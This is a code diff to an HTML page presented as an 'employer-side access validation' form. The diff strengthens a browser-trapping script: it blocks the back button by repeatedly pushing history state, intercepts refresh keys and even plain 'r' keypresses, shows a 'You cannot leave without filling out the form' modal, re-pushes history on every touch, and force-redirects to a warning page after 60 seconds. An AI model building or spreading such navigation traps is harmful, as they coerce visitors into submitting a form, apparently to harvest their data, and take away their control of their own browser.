@@ -75,6 +75,40 @@
         padding: 20px;
       }
     }
+
+    /* Modal Warning Styling */
+    #warningModal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.75);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      color: #fff;
+      font-size: 18px;
+      padding: 20px;
+    }
+
+    #warningModalContent {
+      background: #222;
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 300px;
+      margin: auto;
+    }
+
+    #warningModalContent button {
+      margin-top: 15px;
+      padding: 10px 20px;
+      background: #007bff;
+      border: none;
+      border-radius: 5px;
+      color: #fff;
+      font-size: 16px;
+    }
   </style>
 </head>
 <body>
@@ -97,33 +131,60 @@
     <div class="footer">This form is required for employer-side access validation.</div>
   </div>
 
+  <!-- Modal Warning -->
+  <div id="warningModal">
+    <div id="warningModalContent">
+      ⚠ You cannot leave without filling out the form.
+      <br><br>
+      <button onclick="document.getElementById('warningModal').style.display='none'">OK</button>
+    </div>
+  </div>
+
   <script>
     let backAttempts = 0;
     const maxAttempts = 7;
-    history.pushState(null, null, location.href);
 
-    window.onpopstate = () => {
+    // Initialize history state
+    history.pushState({ page: 1 }, "", "");
+
+    // Show modal instead of alert
+    function showWarning() {
+      const modal = document.getElementById("warningModal");
+      if (modal) modal.style.display = "flex";
+    }
+
+    // Back button trap
+    window.addEventListener("popstate", () => {
       backAttempts++;
       if (backAttempts < maxAttempts) {
-        history.pushState(null, null, location.href);
-        alert("⚠ You cannot leave without filling out the form.");
+        history.pushState({ page: 1 }, "", "");
+        showWarning();
+      } else {
+        window.location.href = "/warning";
       }
-    };
+    });
 
-    document.onkeydown = (e) => {
-      if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
+    // Block refresh (F5 or Ctrl+R)
+    document.addEventListener("keydown", (e) => {
+      if (["F5", "r", "R"].includes(e.key) || (e.ctrlKey && ["r", "R"].includes(e.key))) {
         e.preventDefault();
-        alert("⛔ Refresh is blocked during verification.");
+        showWarning();
       }
-    };
+    });
 
+    // Confirm before unload (closing tab or navigating away)
     window.onbeforeunload = () => {
       if (backAttempts < maxAttempts) {
-        return "⚠ Leaving now may result in validation failure.";
+        return "⚠ You cannot leave without filling out the form.";
       }
     };
 
-    // Optional auto-redirect after 60s
+    // Mobile tap to keep history alive
+    document.addEventListener("touchstart", () => {
+      history.pushState({ page: 1 }, "", "");
+    });
+
+    // Auto redirect to warning after 60 seconds
     setTimeout(() => {
       window.location.href = "/warning";
     }, 60000);
